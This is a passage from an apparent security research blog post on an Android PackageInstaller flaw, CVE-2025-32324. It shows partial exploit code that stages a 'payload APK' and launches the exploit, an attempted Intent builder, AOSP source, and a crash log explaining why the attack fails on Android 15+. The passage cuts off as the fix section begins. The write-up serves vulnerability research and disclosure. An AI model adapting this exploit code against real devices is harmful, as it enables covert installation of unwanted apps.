</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// step 1: extract our payload APK from app assets</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>File</span><span class=w> </span><span class=n>apkFile</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>File</span><span class=p>(</span><span class=n>context</span><span class=p>.</span><span class=na>getCacheDir</span><span class=p>(),</span><span class=w> </span><span class=n>asset</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Android</span><span class=p>.</span><span class=na>copyAsset</span><span class=p>(</span><span class=n>context</span><span class=p>,</span><span class=w> </span><span class=n>asset</span><span class=p>,</span><span class=w> </span><span class=n>apkFile</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// step 2: set up the PackageInstaller session</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>sessionId</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>AndroidH</span><span class=p>.</span><span class=na>writeApkToPackageInstaller</span><span class=p>(</span><span class=n>context</span><span class=p>,</span><span class=w> </span><span class=n>apkFile</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// step 3: copy to Downloads so PackageInstaller can access it</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// (this creates a duplicate but it&#39;s necessary for the file URI)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Android</span><span class=p>.</span><span class=na>copyFileToDownload</span><span class=p>(</span><span class=n>context</span><span class=p>,</span><span class=w> </span><span class=n>apkFile</span><span class=p>,</span><span class=w> </span><span class=n>apkFile</span><span class=p>.</span><span class=na>getName</span><span class=p>(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=s>&#34;application/vnd.android.package-archive&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// step 4: launch the exploit!</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// we use file:// URI because when executed as UID 1000,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// FileUriExposedException restrictions don&#39;t apply to us</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>File</span><span class=w> </span><span class=n>apkFileInDownload</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>File</span><span class=p>(</span><span class=n>Environment</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>.</span><span class=na>getExternalStoragePublicDirectory</span><span class=p>(</span><span class=n>Environment</span><span class=p>.</span><span class=na>DIRECTORY_DOWNLOADS</span><span class=p>),</span><span class=w> </span><span class=n>apkFile</span><span class=p>.</span><span class=na>getName</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>exploitCVE_2025_32324</span><span class=p>(</span><span class=n>sessionId</span><span class=p>,</span><span class=w> </span><span class=n>apkFileInDownload</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>Unfortunately, this approach hit a roadblock. The <code>InstallInstalling</code> activity expects an <code>ApplicationInfo</code> object as a parameter, which cannot be serialized and passed through the command line interface:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Intent</span><span class=w> </span><span class=nf>createInstallingIntent</span><span class=p>(</span><span class=n>Context</span><span class=w> </span><span class=n>context</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>sessionId</span><span class=p>,</span><span class=w> </span><span class=n>File</span><span class=w> </span><span class=n>apkFile</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// this is how we WOULD construct the Intent if we had proper API access</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Intent</span><span class=w> </span><span class=n>installingIntent</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Intent</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>installingIntent</span><span class=p>.</span><span class=na>setClassName</span><span class=p>(</span><span class=n>Constants</span><span class=p>.</span><span class=na>Package</span><span class=p>.</span><span class=na>PACKAGE_INSTALLER</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Constants</span><span class=p>.</span><span class=na>Package</span><span class=p>.</span><span class=na>PACKAGE_INSTALLER</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;.InstallInstalling&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>installingIntent</span><span class=p>.</span><span class=na>putExtra</span><span class=p>(</span><span class=s>&#34;EXTRA_STAGED_SESSION_ID&#34;</span><span class=p>,</span><span class=w> </span><span class=n>sessionId</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>installingIntent</span><span class=p>.</span><span class=na>setData</span><span class=p>(</span><span class=n>Uri</span><span class=p>.</span><span class=na>fromFile</span><span class=p>(</span><span class=n>apkFile</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// extract package info from the APK file</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>PackageInfo</span><span class=w> </span><span class=n>packageInfo</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>context</span><span class=p>.</span><span class=na>getPackageManager</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>.</span><span class=na>getPackageArchiveInfo</span><span class=p>(</span><span class=n>apkFile</span><span class=p>.</span><span class=na>getAbsolutePath</span><span class=p>(),</span><span class=w> </span><span class=n>PackageManager</span><span class=p>.</span><span class=na>GET_PERMISSIONS</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>packageInfo</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>e</span><span class=p>(</span><span class=n>TAG</span><span class=p>,</span><span class=w> </span><span class=s>&#34;getPackageArchiveInfo returns null, failed to auto install.&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>installingIntent</span><span class=p>.</span><span class=na>addFlags</span><span class=p>(</span><span class=n>Intent</span><span class=p>.</span><span class=na>FLAG_ACTIVITY_NEW_TASK</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// hERE&#39;S THE PROBLEM: this complex object can&#39;t be serialized via command line!</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// the &#39;am&#39; command has no way to pass this ApplicationInfo structure</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>installingIntent</span><span class=p>.</span><span class=na>putExtra</span><span class=p>(</span><span class=s>&#34;com.android.packageinstaller.applicationInfo&#34;</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>packageInfo</span><span class=p>.</span><span class=na>applicationInfo</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>installingIntent</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h3 id=the-android-15-roadblock>The Android 15+ Roadblock<a hidden class=anchor aria-hidden=true href=#the-android-15-roadblock>#</a></h3><p>What made this particularly frustrating was that this attack vector would have worked in Android 14 and earlier! In older versions, the missing <code>ApplicationInfo</code> object would cause UI display issues but wouldn&rsquo;t prevent the actual installation from proceeding in the background.</p><p>However, Google introduced a change that completely broke this exploitation path:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-diff data-lang=diff><span class=line><span class=cl><span class=gd>-            PackageUtil.AppSnippet as = getIntent()
</span></span></span><span class=line><span class=cl><span class=gd>-                    .getParcelableExtra(EXTRA_APP_SNIPPET, PackageUtil.AppSnippet.class);
</span></span></span><span class=line><span class=cl><span class=gd></span><span class=gi>+
</span></span></span><span class=line><span class=cl><span class=gi>+            // Dialogs displayed while changing update-owner have a blank icon. To fix this,
</span></span></span><span class=line><span class=cl><span class=gi>+            // fetch the appSnippet from the source file again
</span></span></span><span class=line><span class=cl><span class=gi>+            PackageUtil.AppSnippet as = PackageUtil.getAppSnippet(this, appInfo, sourceFile);
</span></span></span><span class=line><span class=cl><span class=gi>+            getIntent().putExtra(EXTRA_APP_SNIPPET, as);
</span></span></span></code></pre></td></tr></table></div></div><p>This change moved the <code>ApplicationInfo</code> dependency much earlier in the execution flow. Instead of the appInfo object being used only after installation begins, the new code immediately calls <code>PackageUtil.getAppSnippet</code> during activity creation, which heavily depends on appInfo being non-null:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * this is the method that kills our exploitation attempt.
</span></span></span><span class=line><span class=cl><span class=cm> * it expects a fully populated ApplicationInfo object, which we can&#39;t provide.
</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>AppSnippet</span><span class=w> </span><span class=nf>getAppSnippet</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Activity</span><span class=w> </span><span class=n>pContext</span><span class=p>,</span><span class=w> </span><span class=n>ApplicationInfo</span><span class=w> </span><span class=n>appInfo</span><span class=p>,</span><span class=w> </span><span class=n>File</span><span class=w> </span><span class=n>sourceFile</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>archiveFilePath</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>sourceFile</span><span class=p>.</span><span class=na>getAbsolutePath</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>PackageManager</span><span class=w> </span><span class=n>pm</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pContext</span><span class=p>.</span><span class=na>getPackageManager</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// BOOM! this line crashes with NPE when appInfo is null</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>appInfo</span><span class=p>.</span><span class=na>publicSourceDir</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>archiveFilePath</span><span class=p>;</span><span class=w>  </span><span class=c1>// NullPointerException here!</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// handle split APKs (we never get this far with null appInfo)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>appInfo</span><span class=p>.</span><span class=na>splitNames</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>appInfo</span><span class=p>.</span><span class=na>splitSourceDirs</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>final</span><span class=w> </span><span class=n>File</span><span class=o>[]</span><span class=w> </span><span class=n>files</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>sourceFile</span><span class=p>.</span><span class=na>getParentFile</span><span class=p>().</span><span class=na>listFiles</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>(</span><span class=n>dir</span><span class=p>,</span><span class=w> </span><span class=n>name</span><span class=p>)</span><span class=w> </span><span class=o>-&gt;</span><span class=w> </span><span class=n>name</span><span class=p>.</span><span class=na>endsWith</span><span class=p>(</span><span class=n>SPLIT_APK_SUFFIX</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>splits</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Arrays</span><span class=p>.</span><span class=na>stream</span><span class=p>(</span><span class=n>appInfo</span><span class=p>.</span><span class=na>splitNames</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>.</span><span class=na>map</span><span class=p>(</span><span class=n>i</span><span class=w> </span><span class=o>-&gt;</span><span class=w> </span><span class=n>findFilePath</span><span class=p>(</span><span class=n>files</span><span class=p>,</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>SPLIT_APK_SUFFIX</span><span class=p>))</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>.</span><span class=na>filter</span><span class=p>(</span><span class=n>Objects</span><span class=p>::</span><span class=n>nonNull</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>.</span><span class=na>toArray</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=p>::</span><span class=k>new</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>appInfo</span><span class=p>.</span><span class=na>splitSourceDirs</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>splits</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>appInfo</span><span class=p>.</span><span class=na>splitPublicSourceDirs</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>splits</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// extract app label from resources</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>CharSequence</span><span class=w> </span><span class=n>label</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>appInfo</span><span class=p>.</span><span class=na>labelRes</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>label</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>appInfo</span><span class=p>.</span><span class=na>loadLabel</span><span class=p>(</span><span class=n>pm</span><span class=p>);</span><span class=w>  </span><span class=c1>// more NPE potential here</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Resources</span><span class=p>.</span><span class=na>NotFoundException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// fail silently</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>label</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>label</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>appInfo</span><span class=p>.</span><span class=na>nonLocalizedLabel</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=o>?</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>appInfo</span><span class=p>.</span><span class=na>nonLocalizedLabel</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>appInfo</span><span class=p>.</span><span class=na>packageName</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// load app icon</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Drawable</span><span class=w> </span><span class=n>icon</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>appInfo</span><span class=p>.</span><span class=na>icon</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>icon</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>appInfo</span><span class=p>.</span><span class=na>loadIcon</span><span class=p>(</span><span class=n>pm</span><span class=p>);</span><span class=w>  </span><span class=c1>// and here too</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Resources</span><span class=p>.</span><span class=na>NotFoundException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=c1>// icon not found, use default</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>icon</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>icon</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pContext</span><span class=p>.</span><span class=na>getPackageManager</span><span class=p>().</span><span class=na>getDefaultActivityIcon</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>OutOfMemoryError</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>i</span><span class=p>(</span><span class=n>LOG_TAG</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Could not load app icon&#34;</span><span class=p>,</span><span class=w> </span><span class=n>e</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>PackageUtil</span><span class=p>.</span><span class=na>AppSnippet</span><span class=p>(</span><span class=n>label</span><span class=p>,</span><span class=w> </span><span class=n>icon</span><span class=p>,</span><span class=w> </span><span class=n>pContext</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>My testing confirmed this roadblock: the moment <code>PackageUtil.getAppSnippet</code> tries to access <code>appInfo.publicSourceDir</code>, a NullPointerException crashes the entire PackageInstaller process:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>E  FATAL EXCEPTION: main
</span></span><span class=line><span class=cl>   Process: com.android.packageinstaller, PID: 31447
</span></span><span class=line><span class=cl>   java.lang.RuntimeException: Unable to start activity ComponentInfo{com.android.packageinstaller/com.android.packageinstaller.InstallInstalling}: java.lang.NullPointerException: Attempt to write to field &#39;java.lang.String android.content.pm.ApplicationInfo.publicSourceDir&#39; on a null object reference in method &#39;com.android.packageinstaller.PackageUtil$AppSnippet com.android.packageinstaller.PackageUtil.getAppSnippet(android.app.Activity, android.content.pm.ApplicationInfo, java.io.File)&#39;
</span></span><span class=line><span class=cl>        at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:4206)
</span></span><span class=line><span class=cl>        at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:4393)
</span></span><span class=line><span class=cl>        at android.app.servertransaction.LaunchActivityItem.execute(LaunchActivityItem.java:222)
</span></span><span class=line><span class=cl>        at android.app.servertransaction.TransactionExecutor.executeNonLifecycleItem(TransactionExecutor.java:133)
</span></span><span class=line><span class=cl>        at android.app.servertransaction.TransactionExecutor.executeTransactionItems(TransactionExecutor.java:103)
</span></span><span class=line><span class=cl>        at android.app.servertransaction.TransactionExecutor.execute(TransactionExecutor.java:80)
</span></span><span class=line><span class=cl>        at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2773)
</span></span><span class=line><span class=cl>        at android.os.Handler.dispatchMessage(Handler.java:109)
</span></span><span class=line><span class=cl>        at android.os.Looper.loopOnce(Looper.java:232)
</span></span><span class=line><span class=cl>        at android.os.Looper.loop(Looper.java:317)
</span></span><span class=line><span class=cl>        at android.app.ActivityThread.main(ActivityThread.java:8934)
</span></span><span class=line><span class=cl>        at java.lang.reflect.Method.invoke(Native Method)
</span></span><span class=line><span class=cl>        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:591)
</span></span><span class=line><span class=cl>        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:911)
</span></span><span class=line><span class=cl>   Caused by: java.lang.NullPointerException: Attempt to write to field &#39;java.lang.String android.content.pm.ApplicationInfo.publicSourceDir&#39; on a null object reference in method &#39;com.android.packageinstaller.PackageUtil$AppSnippet com.android.packageinstaller.PackageUtil.getAppSnippet(android.app.Activity, android.content.pm.ApplicationInfo, java.io.File)&#39;
</span></span><span class=line><span class=cl>        at com.android.packageinstaller.PackageUtil.getAppSnippet(PackageUtil.java:240)
</span></span><span class=line><span class=cl>        at com.android.packageinstaller.InstallInstalling.onCreate(InstallInstalling.java:99)
</span></span><span class=line><span class=cl>        at android.app.Activity.performCreate(Activity.java:9079)
</span></span><span class=line><span class=cl>        at android.app.Activity.performCreate(Activity.java:9057)
</span></span><span class=line><span class=cl>        at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1531)
</span></span><span class=line><span class=cl>        at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:4188)
</span></span><span class=line><span class=cl>        at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:4393) 
</span></span><span class=line><span class=cl>        at android.app.servertransaction.LaunchActivityItem.execute(LaunchActivityItem.java:222) 
</span></span><span class=line><span class=cl>        at android.app.servertransaction.TransactionExecutor.executeNonLifecycleItem(TransactionExecutor.java:133) 
</span></span><span class=line><span class=cl>        at android.app.servertransaction.TransactionExecutor.executeTransactionItems(TransactionExecutor.java:103) 
</span></span><span class=line><span class=cl>        at android.app.servertransaction.TransactionExecutor.execute(TransactionExecutor.java:80) 
</span></span><span class=line><span class=cl>        at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2773) 
</span></span><span class=line><span class=cl>        at android.os.Handler.dispatchMessage(Handler.java:109) 
</span></span><span class=line><span class=cl>        at android.os.Looper.loopOnce(Looper.java:232) 
</span></span><span class=line><span class=cl>        at android.os.Looper.loop(Looper.java:317) 
</span></span><span class=line><span class=cl>        at android.app.ActivityThread.main(ActivityThread.java:8934) 
</span></span><span class=line><span class=cl>        at java.lang.reflect.Method.invoke(Native Method) 
</span></span><span class=line><span class=cl>        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:591) 
</span></span><span class=line><span class=cl>        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:911) 
</span></span></code></pre></td></tr></table></div></div><h2 id=the-fix>The Fix<a hidden class=anchor aria-hidden=true href=#the-fix>#</a></h2><p>Google eventually addressed this vulnerability with a straightforward fix that eliminates the problematic thread transition. Here&rsquo;s the patch that landed in the Android source tree:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
